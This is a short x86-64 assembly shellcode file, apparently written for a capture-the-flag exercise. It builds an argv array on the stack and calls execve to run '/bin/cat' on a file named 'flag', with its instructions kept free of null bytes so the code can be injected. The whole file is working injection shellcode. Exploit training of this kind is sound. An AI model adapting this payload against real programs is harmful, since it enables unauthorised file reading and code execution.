.global _start
_start:
.intel_syntax noprefix
    # int3 # to debug
	xor rax,rax
	push rax                    # null byte
	
arraybuilder: # right to left
	mov rdx, 0x67616c662f2f2f2f # ////flag reversed
	push rdx
	mov rdx, rsp
	push rax                    # null byte
	
	# store argv[0] -> cat
	mov rdi, 0x7461632f6e69622f # /bin/cat reversed
	push rdi
	mov rdi, rsp
	push rax                    # null byte

setregisters:
	push rdx                    # argv[1]
	push rdi                    # argv[0]
	
dosyscall:
	mov rsi, rsp                # argv **
	xor rdx,rdx                 # null envp
	add rax, 0x3b               # execve syscall index
	syscall
